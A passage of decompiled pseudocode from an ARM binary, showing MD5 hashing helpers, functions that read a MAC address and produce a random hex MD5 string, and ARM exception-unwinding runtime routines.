  while ((*param_1 & 0x3f) != 0x38) {
    av_md5_update(param_1,iVar2,1);
  }
  av_md5_update(param_1,&local_18,8);
  iVar2 = 0;
  do {
    uVar1 = *(undefined4 *)((int)param_1 + iVar2 + 0x54);
    iVar2 = iVar2 + -4;
    *param_2 = (char)uVar1;
    param_2[1] = (char)((uint)uVar1 >> 8);
    param_2[3] = (char)((uint)uVar1 >> 0x18);
    param_2[2] = (char)((uint)uVar1 >> 0x10);
    param_2 = param_2 + 4;
  } while (iVar2 != -0x10);
  return CONCAT44(local_14,local_18);
}


/* === av_md5_sum @ 000131f4 === */

void av_md5_sum(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  int *piVar1;
  undefined1 auStack_78 [92];
  int local_1c;
  
  piVar1 = *(int **)(DAT_00013230 + 0x13200);
  local_1c = *piVar1;
  av_md5_init(auStack_78);
  av_md5_update(auStack_78,param_2,param_3);
  av_md5_final(auStack_78,param_1);
  if (local_1c != *piVar1) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}


/* === get_hexlified_md5 @ 00013234 === */

void get_hexlified_md5(undefined4 param_1,char *param_2,undefined4 param_3)

{
  byte *pbVar1;
  int *piVar2;
  char *__format;
  int iVar3;
  byte local_2c [16];
  int local_1c;
  
  piVar2 = *(int **)(DAT_0001328c + 0x13240);
  local_1c = *piVar2;
  memset(local_2c,0,0x10);
  av_md5_sum(local_2c,param_1,param_3);
  iVar3 = 0;
  __format = (char *)(DAT_00013290 + 0x13268);
  do {
    pbVar1 = local_2c + iVar3;
    iVar3 = iVar3 + 1;
    snprintf(param_2,0x20,__format,(uint)*pbVar1);
    param_2 = param_2 + 2;
  } while (iVar3 != 0x10);
  if (local_1c != *piVar2) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}


/* === get_random_hexlified_md5 @ 00013294 === */

undefined8 get_random_hexlified_md5(undefined4 param_1,time_t param_2,undefined4 param_3)

{
  int __fd;
  ssize_t sVar1;
  time_t *ptVar2;
  undefined4 uVar3;
  int *piVar4;
  time_t local_20;
  time_t tStack_1c;
  undefined4 uStack_18;
  int local_14;
  
  ptVar2 = &local_20;
  piVar4 = *(int **)(DAT_000132e8 + 0x132a0);
  local_14 = *piVar4;
  local_20 = 0;
  tStack_1c = param_2;
  uStack_18 = param_3;
  __fd = open((char *)(DAT_000132ec + 0x132a6),0);
  sVar1 = read(__fd,&tStack_1c,8);
  if ((sVar1 == 8) && (-1 < __fd)) {
    uVar3 = 8;
    ptVar2 = &tStack_1c;
  }
  else {
    local_20 = time((time_t *)0x0);
    uVar3 = 4;
  }
  get_hexlified_md5(ptVar2,param_1,uVar3);
  if (local_14 != *piVar4) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return CONCAT44(tStack_1c,local_20);
}


/* === get_mac_address @ 000132f0 === */

void get_mac_address(char *param_1)

{
  FILE *__stream;
  int *piVar1;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  char acStack_28 [20];
  int local_14;
  
  piVar1 = *(int **)(DAT_0001338c + 0x132fc);
  local_14 = *piVar1;
  memset(acStack_28,0,0x14);
  local_40 = 0;
  local_3c = 0;
  local_38 = 0;
  local_34 = 0;
  local_30 = 0;
  local_2c = 0;
  __stream = fopen(*(char **)(DAT_00013390 + 0x13314),(char *)(DAT_00013394 + 0x13318));
  if (__stream != (FILE *)0x0) {
    fread(acStack_28,1,0x13,__stream);
    sscanf(acStack_28,(char *)(DAT_00013398 + 0x1334a),&local_40,&local_3c,&local_38,&local_34,
           &local_30,&local_2c);
    snprintf(param_1,0x13,(char *)(DAT_0001339c + 0x13362),local_40,local_3c,local_38,local_34,
             local_30,local_2c);
    fclose(__stream);
  }
  if (local_14 != *piVar1) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}


/* === FUN_000133a0 @ 000133a0 === */

int FUN_000133a0(uint *param_1)

{
  uint uVar1;
  
  uVar1 = *param_1;
  if ((uVar1 & 0x40000000) == 0) {
    uVar1 = uVar1 & 0x7fffffff;
  }
  else {
    uVar1 = uVar1 | 0x80000000;
  }
  return (int)param_1 + uVar1;
}


/* === FUN_000133b8 @ 000133b8 === */

undefined4 FUN_000133b8(int param_1,int param_2)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  undefined4 uVar6;
  int iVar7;
  int iVar8;
  uint uVar9;
  int iVar10;
  int iVar11;
  int iVar12;
  bool bVar13;
  int local_2c [2];
  
  iVar8 = DAT_00013570 + 0x133cc;
  uVar9 = param_2 - 2;
  if (*(int *)(iVar8 + DAT_00013574) == 0) {
    iVar2 = *(int *)(iVar8 + DAT_0001357c);
    local_2c[0] = *(int *)(iVar8 + DAT_00013578) - iVar2 >> 3;
LAB_00013414:
    if (local_2c[0] != 0) {
      iVar7 = local_2c[0] + -1;
      iVar11 = 0;
      iVar12 = iVar7;
      while( true ) {
        while( true ) {
          iVar1 = (iVar11 + iVar12) / 2;
          iVar10 = iVar2 + iVar1 * 8;
          uVar3 = FUN_000133a0(iVar10);
          if (iVar1 == iVar7) {
            uVar4 = 0xffffffff;
          }
          else {
            iVar5 = FUN_000133a0(iVar2 + (iVar1 + 1) * 8);
            uVar4 = iVar5 - 1;
          }
          if (uVar3 <= uVar9) break;
          if (iVar1 == iVar11) goto LAB_000134a8;
          iVar12 = iVar1 + -1;
        }
        if (uVar9 <= uVar4) break;
        iVar11 = iVar1 + 1;
      }
      if (iVar10 != 0) {
        uVar6 = FUN_000133a0(iVar10);
        iVar2 = *(int *)(iVar10 + 4);
        bVar13 = iVar2 == 1;
        if (bVar13) {
          iVar2 = 0;
          *(undefined4 *)(param_1 + 0x10) = 0;
        }
        *(undefined4 *)(param_1 + 0x48) = uVar6;
        if (bVar13) {
          return 5;
        }
        if (iVar2 < 0) {
          *(int *)(param_1 + 0x4c) = iVar10 + 4;
        }
        else {
          uVar6 = FUN_000133a0();
          *(undefined4 *)(param_1 + 0x4c) = uVar6;
        }
        *(uint *)(param_1 + 0x50) = (uint)(iVar2 < 0);
        if (-1 < (int)**(uint **)(param_1 + 0x4c)) {
          uVar6 = FUN_000133a0();
          *(undefined4 *)(param_1 + 0x10) = uVar6;
          return 0;
        }
        uVar9 = **(uint **)(param_1 + 0x4c) >> 0x18 & 0xf;
        if (uVar9 == 0) {
          *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)(iVar8 + DAT_00013580);
          return 0;
        }
        iVar2 = DAT_00013584;
        if ((uVar9 == 1) || (iVar2 = DAT_00013588, uVar9 == 2)) {
          *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)(iVar8 + iVar2);
          return 0;
        }
        goto LAB_00013554;
      }
    }
LAB_000134a8:
    *(undefined4 *)(param_1 + 0x10) = 0;
  }
  else {
    iVar2 = __gnu_Unwind_Find_exidx(uVar9,local_2c);
    if (iVar2 != 0) goto LAB_00013414;
LAB_00013554:
    *(undefined4 *)(param_1 + 0x10) = 0;
  }
  return 9;
}


/* === FUN_0001358c @ 0001358c === */

void FUN_0001358c(uint *param_1)

{
  if ((*param_1 & 1) == 0) {
    if ((*param_1 & 2) == 0) {
      __gnu_Unwind_Restore_VFP(param_1 + 0x12);
    }
    else {
      __gnu_Unwind_Restore_VFP_D();
    }
  }
  if ((*param_1 & 4) == 0) {
    __gnu_Unwind_Restore_VFP_D_16_to_31(param_1 + 0x34);
  }
  if ((*param_1 & 8) == 0) {
    __gnu_Unwind_Restore_WMMXD(param_1 + 0x6c);
  }
  if ((*param_1 & 0x10) != 0) {
    return;
  }
  __gnu_Unwind_Restore_WMMXC(param_1 + 0x8c);
  return;
}


/* === FUN_000135f8 @ 000135f8 === */

int FUN_000135f8(int param_1,int param_2,int param_3)

{
  int iVar1;
  int iVar2;
  int iVar3;
  code *pcVar4;
  undefined4 uVar5;
  uint uVar6;
  undefined4 local_4a0;
  undefined4 local_49c;
  undefined4 uStack_498;
  undefined4 uStack_494;
  undefined4 uStack_490;
  undefined4 local_48c;
  undefined4 uStack_488;
  undefined4 uStack_484;
  undefined4 uStack_480;
  undefined4 local_47c;
  undefined4 uStack_478;
  undefined4 uStack_474;
  undefined4 uStack_470;
  undefined4 local_46c;
  undefined4 local_468;
  undefined4 uStack_464;
  undefined4 local_460;
  undefined4 local_45c;
  undefined1 auStack_260 [56];
  undefined4 local_228;
  
  pcVar4 = *(code **)(param_1 + 0xc);
  uVar5 = *(undefined4 *)(param_1 + 0x18);
  local_49c = *(undefined4 *)(param_2 + 4);
  uStack_498 = *(undefined4 *)(param_2 + 8);
  uStack_494 = *(undefined4 *)(param_2 + 0xc);
  uStack_490 = *(undefined4 *)(param_2 + 0x10);
  local_48c = *(undefined4 *)(param_2 + 0x14);
  uStack_488 = *(undefined4 *)(param_2 + 0x18);
  uStack_484 = *(undefined4 *)(param_2 + 0x1c);
  uStack_480 = *(undefined4 *)(param_2 + 0x20);
  local_47c = *(undefined4 *)(param_2 + 0x24);
  uStack_478 = *(undefined4 *)(param_2 + 0x28);
  uStack_474 = *(undefined4 *)(param_2 + 0x2c);
  uStack_470 = *(undefined4 *)(param_2 + 0x30);
  local_46c = *(undefined4 *)(param_2 + 0x34);
  local_468 = *(undefined4 *)(param_2 + 0x38);
  uStack_464 = *(undefined4 *)(param_2 + 0x3c);
  local_460 = *(undefined4 *)(param_2 + 0x40);
  iVar3 = 0;
  local_4a0 = 0;
  do {
    iVar1 = FUN_000133b8(param_1,local_460);
    if (param_3 == 0) {
      uVar6 = 9;
    }
    else {
      uVar6 = 10;
    }
    if (iVar1 == 0) {
      *(undefined4 *)(param_1 + 0x14) = local_460;
      memcpy(auStack_260,&local_4a0,0x240);
      iVar3 = (**(code **)(param_1 + 0x10))(uVar6,param_1,auStack_260);
      local_45c = local_228;
    }
    else {
      uVar6 = uVar6 | 0x10;
      local_45c = local_468;
    }
    iVar2 = (*pcVar4)(1,uVar6,param_1,param_1,&local_4a0,uVar5);
    if (iVar2 != 0) {
      return 9;
    }
    if (iVar1 != 0) {
      return iVar1;
    }
    memcpy(&local_4a0,auStack_260,0x240);
    param_3 = 0;
  } while (iVar3 == 8);
  if (iVar3 == 7) {
    restore_core_regs(&local_49c);
  }
  return 9;
}


/* === FUN_0001370c @ 0001370c === */

undefined4 FUN_0001370c(int param_1,int param_2,undefined4 param_3,undefined4 *param_4)

{
  int iVar1;
  undefined4 uVar2;
  uint extraout_r2;
  int extraout_r3;
  bool bVar3;
  ulonglong uVar4;
  
  do {
    iVar1 = FUN_000133b8(param_1,*(undefined4 *)(param_2 + 0x40));
    if (iVar1 != 0) goto LAB_00013758;
    *(undefined4 *)(param_1 + 0x14) = *(undefined4 *)(param_2 + 0x40);
    iVar1 = (**(code **)(param_1 + 0x10))(1,param_1,param_2);
  } while (iVar1 == 8);
  if (iVar1 == 7) {
    uVar4 = restore_core_regs(param_2 + 4);
    if ((int)(uVar4 >> 0x20) == 0) {
      bVar3 = extraout_r2 == 0xf;
      if (extraout_r2 < 0x10) {
        bVar3 = extraout_r3 == 0;
      }
      if (bVar3) {
        uVar2 = 0;
        *param_4 = *(undefined4 *)((int)uVar4 + extraout_r2 * 4 + 4);
      }
      else {
        uVar2 = 2;
      }
      return uVar2;
    }
    if (uVar4 < 0x500000000) {
      uVar2 = 1;
    }
    else {
      uVar2 = 2;
    }
    return uVar2;
  }
LAB_00013758:
                    /* WARNING: Subroutine does not return */
  abort();
}


/* === _Unwind_VRS_Get @ 00013764 === */

undefined4 _Unwind_VRS_Get(int param_1,uint param_2,uint param_3,int param_4,undefined4 *param_5)

{
  undefined4 uVar1;
  bool bVar2;
  
  if (param_2 == 0) {
    bVar2 = param_3 == 0xf;
    if (param_3 < 0x10) {
      bVar2 = param_4 == 0;
    }
    if (bVar2) {
      uVar1 = 0;
      *param_5 = *(undefined4 *)(param_1 + param_3 * 4 + 4);
    }
    else {
      uVar1 = 2;
    }
    return uVar1;
  }
  if (param_2 < 5) {
    uVar1 = 1;
  }
  else {
    uVar1 = 2;
  }
  return uVar1;
}


/* === FUN_000137a8 @ 000137a8 === */

undefined4 FUN_000137a8(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  undefined4 local_c;
  
  local_c = param_4;
  _Unwind_VRS_Get(param_1,0,param_2,0,&local_c,param_2,param_3);
  return local_c;
}


/* === _Unwind_VRS_Set @ 000137d0 === */

undefined4 _Unwind_VRS_Set(int param_1,uint param_2,uint param_3,int param_4,undefined4 *param_5)

{
  undefined4 uVar1;
  bool bVar2;
  
  if (param_2 == 0) {
    bVar2 = param_3 == 0xf;
    if (param_3 < 0x10) {
      bVar2 = param_4 == 0;
    }
    if (bVar2) {
      uVar1 = 0;
      *(undefined4 *)(param_1 + param_3 * 4 + 4) = *param_5;
    }
    else {
      uVar1 = 2;
    }
    return uVar1;
  }
  if (param_2 < 5) {
    uVar1 = 1;
  }
  else {
    uVar1 = 2;
  }
  return uVar1;
}


/* === FUN_00013814 @ 00013814 === */

void FUN_00013814(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 local_c;
  
  local_c = param_3;
  _Unwind_VRS_Set(param_1,0,param_2,0,&local_c,param_2,param_3);
  return;
}


/* === __aeabi_unwind_cpp_pr2 @ 00013bd4 === */

/* WARNING: Removing unreachable block (ram,0x00013874) */
/* WARNING: Removing unreachable block (ram,0x000138d8) */

undefined4 __aeabi_unwind_cpp_pr2(uint param_1,int param_2,undefined4 param_3)

{
  bool bVar1;
  uint uVar2;
  int iVar3;
  uint *puVar4;
  int iVar5;
  undefined4 uVar6;
  uint uVar7;
  uint *puVar8;
  uint uVar9;
  uint uVar10;
  bool bVar11;
  int iVar12;
  uint uVar13;
  uint *puVar14;
  int iStack_38;
  int iStack_34;
  uint *puStack_30;
  undefined1 uStack_2c;
  undefined1 uStack_2b;
  
  puStack_30 = *(uint **)(param_2 + 0x4c) + 1;
  uVar7 = **(uint **)(param_2 + 0x4c);
  uVar10 = param_1 & 3;
  iStack_34 = uVar7 << 0x10;
  puVar8 = puStack_30 + (uVar7 >> 0x10 & 0xff);
  uStack_2b = (undefined1)(uVar7 >> 0x10);
  uStack_2c = 2;
  if (uVar10 == 2) {
    puVar8 = *(uint **)(param_2 + 0x38);
  }
  if ((*(uint *)(param_2 + 0x50) & 1) == 0) {
    iVar5 = param_2 + 0x58;
    bVar11 = false;
LAB_00013b60:
    do {
      while( true ) {
        uVar7 = *puVar8;
        if (uVar7 == 0) goto LAB_00013b6c;
        uVar13 = puVar8[1];
        puVar4 = puVar8 + 2;
        uVar9 = (uVar13 & 0xfffffffe) + *(int *)(param_2 + 0x48);
        uVar2 = FUN_000137a8(param_3,0xf);
        if (uVar2 < uVar9) {
          bVar1 = false;
        }
        else if (uVar2 < uVar9 + (uVar7 & 0xfffffffe)) {
          bVar1 = true;
        }
        else {
          bVar1 = false;
        }
        uVar7 = uVar7 & 1 | (uVar13 & 1) << 1;
        if (uVar7 != 1) break;
        if (uVar10 == 0) {
          if (bVar1) {
            uVar7 = puVar8[3];
            if (uVar7 == 0xfffffffe) {
              return 9;
            }
            iStack_38 = iVar5;
            if (uVar7 != 0xffffffff) {
              if (uVar7 == 0) {
                uVar6 = 0;
              }
              else {
                uVar6 = *(undefined4 *)((int)puVar4 + uVar7 + 4);
              }
              iVar3 = __cxa_type_match(param_2,uVar6,*puVar4 >> 0x1f,&iStack_38);
              if (iVar3 == 0) {
                iStack_38 = 0;
              }
            }
            if (iStack_38 != 0) {
LAB_00013aa0:
              uVar6 = FUN_000137a8(param_3,0xd);
              *(int *)(param_2 + 0x24) = iStack_38;
              *(uint **)(param_2 + 0x28) = puVar4;
              *(undefined4 *)(param_2 + 0x20) = uVar6;
              return 6;
            }
          }
        }
        else {
          iVar12 = *(int *)(param_2 + 0x20);
          iVar3 = FUN_000137a8(param_3,0xd);
          if ((iVar12 == iVar3) && (puVar4 == *(uint **)(param_2 + 0x28))) {
LAB_00013b18:
            uVar6 = FUN_000133a0(puVar4);
            FUN_00013814(param_3,0xf,uVar6);
            uVar6 = 0;
            goto LAB_00013bb8;
          }
        }
        puVar8 = puVar8 + 4;
      }
      if (uVar7 != 0) {
        if (uVar7 != 2) {
          return 9;
        }
        uVar7 = *puVar4 & 0x7fffffff;
        if (uVar10 == 0) {
          if ((bVar1) && ((param_1 & 8) == 0 || uVar7 == 0)) {
            uVar2 = 0;
            puVar14 = puVar4;
            do {
              uVar9 = uVar2;
              if (uVar9 == uVar7) goto LAB_00013aa0;
              puVar14 = puVar14 + 1;
              uVar6 = 0;
              if (*puVar14 != 0) {
                uVar6 = *(undefined4 *)(*puVar14 + (int)puVar14);
              }
              iStack_38 = iVar5;
              iVar3 = __cxa_type_match(param_2,uVar6,0,&iStack_38);
              uVar2 = uVar9 + 1;
            } while (iVar3 == 0);
            if (uVar9 == uVar7) goto LAB_00013aa0;
          }
        }
        else {
          iVar12 = *(int *)(param_2 + 0x20);
          iVar3 = FUN_000137a8(param_3,0xd);
          if ((iVar12 == iVar3) && (puVar4 == *(uint **)(param_2 + 0x28))) {
            *(undefined4 *)(param_2 + 0x30) = 4;
            *(uint *)(param_2 + 0x28) = uVar7;
            *(undefined4 *)(param_2 + 0x2c) = 0;
            *(uint **)(param_2 + 0x34) = puVar8 + 3;
            if (-1 < (int)*puVar4) {
              puVar4 = puVar4 + uVar7 + 1;
              goto LAB_00013b18;
            }
            bVar11 = true;
          }
        }
        if ((int)*puVar4 < 0) {
          puVar4 = puVar8 + 3;
        }
        puVar8 = puVar4 + uVar7 + 1;
        goto LAB_00013b60;
      }
      if (uVar10 == 0) {
        bVar1 = false;
      }
      puVar8 = puVar8 + 3;
    } while (!bVar1);
    FUN_000133a0(puVar4);
    *(uint **)(param_2 + 0x38) = puVar8;
    iVar5 = __cxa_begin_cleanup(param_2);
    if (iVar5 == 0) {
      return 9;
    }
    uVar6 = 0xf;
  }
  else {
    bVar11 = false;
LAB_00013b6c:
    iVar5 = __gnu_unwind_execute(param_3,&iStack_34);
    if (iVar5 != 0) {
      return 9;
    }
    if (!bVar11) {
      return 8;
    }
    uVar6 = FUN_000137a8(param_3,0xf);
    FUN_00013814(param_3,0xe,uVar6);
    uVar6 = 0xf;
  }
LAB_00013bb8:
  FUN_00013814(param_3,uVar6);
  return 7;
}


/* === __aeabi_unwind_cpp_pr1 @ 00013bdc === */

/* WARNING: Removing unreachable block (ram,0x00013874) */
/* WARNING: Removing unreachable block (ram,0x000138d4) */

undefined4 __aeabi_unwind_cpp_pr1(uint param_1,int param_2,undefined4 param_3)

{
  ushort uVar1;
  bool bVar2;
  uint uVar3;
  int iVar4;
  uint *puVar5;
  int iVar6;
  undefined4 uVar7;
  uint uVar8;
  uint *puVar9;
  uint uVar10;
  uint uVar11;
  bool bVar12;
  int iVar13;
  uint *puVar14;
  int local_38;
  int local_34;
  uint *local_30;
  undefined1 local_2c;
  undefined1 local_2b;
  
  local_30 = *(uint **)(param_2 + 0x4c) + 1;
  uVar8 = **(uint **)(param_2 + 0x4c);
  uVar11 = param_1 & 3;
  local_34 = uVar8 << 0x10;
  puVar9 = local_30 + (uVar8 >> 0x10 & 0xff);
  local_2b = (undefined1)(uVar8 >> 0x10);
  local_2c = 2;
  if (uVar11 == 2) {
    puVar9 = *(uint **)(param_2 + 0x38);
  }
  if ((*(uint *)(param_2 + 0x50) & 1) == 0) {
    iVar6 = param_2 + 0x58;
    bVar12 = false;
LAB_00013b60:
    do {
      while( true ) {
        if (*puVar9 == 0) goto LAB_00013b6c;
        uVar1 = *(ushort *)((int)puVar9 + 2);
        uVar8 = *puVar9;
        puVar5 = puVar9 + 1;
        uVar10 = (uVar1 & 0xfffffffe) + *(int *)(param_2 + 0x48);
        uVar3 = FUN_000137a8(param_3,0xf);
        if (uVar3 < uVar10) {
          bVar2 = false;
        }
        else if (uVar3 < uVar10 + ((ushort)uVar8 & 0xfffffffe)) {
          bVar2 = true;
        }
        else {
          bVar2 = false;
        }
        uVar8 = (ushort)uVar8 & 1 | (uVar1 & 1) << 1;
        if (uVar8 != 1) break;
        if (uVar11 == 0) {
          if (bVar2) {
            uVar8 = puVar9[2];
            if (uVar8 == 0xfffffffe) {
              return 9;
            }
            local_38 = iVar6;
            if (uVar8 != 0xffffffff) {
              if (uVar8 == 0) {
                uVar7 = 0;
              }
              else {
                uVar7 = *(undefined4 *)((int)puVar5 + uVar8 + 4);
              }
              iVar4 = __cxa_type_match(param_2,uVar7,*puVar5 >> 0x1f,&local_38);
              if (iVar4 == 0) {
                local_38 = 0;
              }
            }
            if (local_38 != 0) {
LAB_00013aa0:
              uVar7 = FUN_000137a8(param_3,0xd);
              *(int *)(param_2 + 0x24) = local_38;
              *(uint **)(param_2 + 0x28) = puVar5;
              *(undefined4 *)(param_2 + 0x20) = uVar7;
              return 6;
            }
          }
        }
        else {
          iVar13 = *(int *)(param_2 + 0x20);
          iVar4 = FUN_000137a8(param_3,0xd);
          if ((iVar13 == iVar4) && (puVar5 == *(uint **)(param_2 + 0x28))) {
LAB_00013b18:
            uVar7 = FUN_000133a0(puVar5);
            FUN_00013814(param_3,0xf,uVar7);
            uVar7 = 0;
            goto LAB_00013bb8;
          }
        }
        puVar9 = puVar9 + 3;
      }
      if (uVar8 != 0) {
        if (uVar8 != 2) {
          return 9;
        }
        uVar8 = *puVar5 & 0x7fffffff;
        if (uVar11 == 0) {
          if ((bVar2) && ((param_1 & 8) == 0 || uVar8 == 0)) {
            uVar3 = 0;
            puVar14 = puVar5;
            do {
              uVar10 = uVar3;
              if (uVar10 == uVar8) goto LAB_00013aa0;
              puVar14 = puVar14 + 1;
              uVar7 = 0;
              if (*puVar14 != 0) {
                uVar7 = *(undefined4 *)(*puVar14 + (int)puVar14);
              }
              local_38 = iVar6;
              iVar4 = __cxa_type_match(param_2,uVar7,0,&local_38);
              uVar3 = uVar10 + 1;
            } while (iVar4 == 0);
            if (uVar10 == uVar8) goto LAB_00013aa0;
          }
        }
        else {
          iVar13 = *(int *)(param_2 + 0x20);
          iVar4 = FUN_000137a8(param_3,0xd);
          if ((iVar13 == iVar4) && (puVar5 == *(uint **)(param_2 + 0x28))) {
            *(undefined4 *)(param_2 + 0x30) = 4;
            *(uint *)(param_2 + 0x28) = uVar8;
            *(undefined4 *)(param_2 + 0x2c) = 0;
            *(uint **)(param_2 + 0x34) = puVar9 + 2;
            if (-1 < (int)*puVar5) {
              puVar5 = puVar5 + uVar8 + 1;
              goto LAB_00013b18;
            }
            bVar12 = true;
          }
        }
        if ((int)*puVar5 < 0) {
          puVar5 = puVar9 + 2;
        }
        puVar9 = puVar5 + uVar8 + 1;
        goto LAB_00013b60;
      }
      if (uVar11 == 0) {
        bVar2 = false;
      }
      puVar9 = puVar9 + 2;
    } while (!bVar2);
    FUN_000133a0(puVar5);
    *(uint **)(param_2 + 0x38) = puVar9;
    iVar6 = __cxa_begin_cleanup(param_2);
    if (iVar6 == 0) {
      return 9;
    }
    uVar7 = 0xf;
  }
  else {
    bVar12 = false;
LAB_00013b6c:
    iVar6 = __gnu_unwind_execute(param_3,&local_34);
    if (iVar6 != 0) {
      return 9;
    }
    if (!bVar12) {
      return 8;
    }
    uVar7 = FUN_000137a8(param_3,0xf);
    FUN_00013814(param_3,0xe,uVar7);
    uVar7 = 0xf;
  }
LAB_00013bb8:
  FUN_00013814(param_3,uVar7);
  return 7;
}


/* === __aeabi_unwind_cpp_pr0 @ 00013be4 === */

/* WARNING: Removing unreachable block (ram,0x0001388c) */
/* WARNING: Removing unreachable block (ram,0x000138d4) */

undefined4 __aeabi_unwind_cpp_pr0(uint param_1,int param_2,undefined4 param_3)

{
  ushort uVar1;
  bool bVar2;
  uint uVar3;
  int iVar4;
  uint *puVar5;
  int iVar6;
  undefined4 uVar7;
  uint *puVar8;
  uint uVar9;
  uint uVar10;
  bool bVar11;
  uint uVar12;
  int iVar13;
  uint *puVar14;
  int iStack_38;
  int iStack_34;
  uint *puStack_30;
  undefined1 uStack_2c;
  undefined1 uStack_2b;
  
  puStack_30 = (uint *)(*(int **)(param_2 + 0x4c) + 1);
  uVar10 = param_1 & 3;
  iStack_34 = **(int **)(param_2 + 0x4c) << 8;
  uStack_2b = 0;
  uStack_2c = 3;
  puVar8 = puStack_30;
  if (uVar10 == 2) {
    puVar8 = *(uint **)(param_2 + 0x38);
  }
  if ((*(uint *)(param_2 + 0x50) & 1) == 0) {
    iVar6 = param_2 + 0x58;
    bVar11 = false;
LAB_00013b60:
    do {
      while( true ) {
        if (*puVar8 == 0) goto LAB_00013b6c;
        uVar1 = *(ushort *)((int)puVar8 + 2);
        uVar12 = *puVar8;
        puVar5 = puVar8 + 1;
        uVar9 = (uVar1 & 0xfffffffe) + *(int *)(param_2 + 0x48);
        uVar3 = FUN_000137a8(param_3,0xf);
        if (uVar3 < uVar9) {
          bVar2 = false;
        }
        else if (uVar3 < uVar9 + ((ushort)uVar12 & 0xfffffffe)) {
          bVar2 = true;
        }
        else {
          bVar2 = false;
        }
        uVar12 = (ushort)uVar12 & 1 | (uVar1 & 1) << 1;
        if (uVar12 != 1) break;
        if (uVar10 == 0) {
          if (bVar2) {
            uVar12 = puVar8[2];
            if (uVar12 == 0xfffffffe) {
              return 9;
            }
            iStack_38 = iVar6;
            if (uVar12 != 0xffffffff) {
              if (uVar12 == 0) {
                uVar7 = 0;
              }
              else {
                uVar7 = *(undefined4 *)((int)puVar5 + uVar12 + 4);
              }
              iVar4 = __cxa_type_match(param_2,uVar7,*puVar5 >> 0x1f,&iStack_38);
              if (iVar4 == 0) {
                iStack_38 = 0;
              }
            }
            if (iStack_38 != 0) {
LAB_00013aa0:
              uVar7 = FUN_000137a8(param_3,0xd);
              *(int *)(param_2 + 0x24) = iStack_38;
              *(uint **)(param_2 + 0x28) = puVar5;
              *(undefined4 *)(param_2 + 0x20) = uVar7;
              return 6;
            }
          }
        }
        else {
          iVar13 = *(int *)(param_2 + 0x20);
          iVar4 = FUN_000137a8(param_3,0xd);
          if ((iVar13 == iVar4) && (puVar5 == *(uint **)(param_2 + 0x28))) {
LAB_00013b18:
            uVar7 = FUN_000133a0(puVar5);
            FUN_00013814(param_3,0xf,uVar7);
            uVar7 = 0;
            goto LAB_00013bb8;
          }
        }
        puVar8 = puVar8 + 3;
      }
      if (uVar12 != 0) {
        if (uVar12 != 2) {
          return 9;
        }
        uVar12 = *puVar5 & 0x7fffffff;
        if (uVar10 == 0) {
          if ((bVar2) && ((param_1 & 8) == 0 || uVar12 == 0)) {
            uVar3 = 0;
            puVar14 = puVar5;
            do {
              uVar9 = uVar3;
              if (uVar9 == uVar12) goto LAB_00013aa0;
              puVar14 = puVar14 + 1;
              uVar7 = 0;
              if (*puVar14 != 0) {
                uVar7 = *(undefined4 *)(*puVar14 + (int)puVar14);
              }
              iStack_38 = iVar6;
              iVar4 = __cxa_type_match(param_2,uVar7,0,&iStack_38);
              uVar3 = uVar9 + 1;
            } while (iVar4 == 0);
            if (uVar9 == uVar12) goto LAB_00013aa0;
          }
        }
        else {
          iVar13 = *(int *)(param_2 + 0x20);
          iVar4 = FUN_000137a8(param_3,0xd);
          if ((iVar13 == iVar4) && (puVar5 == *(uint **)(param_2 + 0x28))) {
            *(undefined4 *)(param_2 + 0x30) = 4;
            *(uint *)(param_2 + 0x28) = uVar12;
            *(undefined4 *)(param_2 + 0x2c) = 0;
            *(uint **)(param_2 + 0x34) = puVar8 + 2;
            if (-1 < (int)*puVar5) {
              puVar5 = puVar5 + uVar12 + 1;
              goto LAB_00013b18;
            }
            bVar11 = true;
          }
        }
        if ((int)*puVar5 < 0) {
          puVar5 = puVar8 + 2;
        }
        puVar8 = puVar5 + uVar12 + 1;
        goto LAB_00013b60;
      }
      if (uVar10 == 0) {
        bVar2 = false;
      }
      puVar8 = puVar8 + 2;
    } while (!bVar2);
    FUN_000133a0(puVar5);
    *(uint **)(param_2 + 0x38) = puVar8;
    iVar6 = __cxa_begin_cleanup(param_2);
    if (iVar6 == 0) {
      return 9;
    }
    uVar7 = 0xf;
  }
  else {
    bVar11 = false;
LAB_00013b6c:
    iVar6 = __gnu_unwind_execute(param_3,&iStack_34);
    if (iVar6 != 0) {
      return 9;
    }
    if (!bVar11) {
      return 8;
    }
    uVar7 = FUN_000137a8(param_3,0xf);
    FUN_00013814(param_3,0xe,uVar7);
    uVar7 = 0xf;
  }
LAB_00013bb8:
  FUN_00013814(param_3,uVar7);
  return 7;
}


/* === _Unwind_VRS_Pop @ 00013bec === */

undefined4 _Unwind_VRS_Pop(uint *param_1,undefined4 param_2,uint param_3,int param_4)

{
  uint uVar1;
  undefined4 *puVar2;
  uint *puVar3;
  uint uVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  uint uVar7;
  int iVar8;
  bool bVar9;
  bool bVar10;
  bool bVar11;
  undefined4 auStack_228 [28];
  undefined4 local_1b8 [4];
  undefined1 auStack_1a8 [128];
  undefined4 auStack_128 [32];
  undefined4 auStack_a8 [35];
  
  switch(param_2) {
  case 0:
    if (param_4 != 0) {
      return 2;
    }
    puVar3 = (uint *)param_1[0xe];
    uVar7 = 0;
    do {
      if ((param_3 & 0xffff & 1 << (uVar7 & 0xff)) != 0) {
        param_1[uVar7 + 1] = *puVar3;
        puVar3 = puVar3 + 1;
      }
      uVar7 = uVar7 + 1;
    } while (uVar7 != 0x10);
    if ((param_3 & 0x2000) != 0) {
      return 0;
    }
    param_1[0xe] = (uint)puVar3;
    return 0;
  case 1:
    if (param_4 != 1 && param_4 != 5) {
      return 2;
    }
    uVar7 = param_3 >> 0x10;
    param_3 = param_3 & 0xffff;
    uVar4 = param_3 + uVar7;
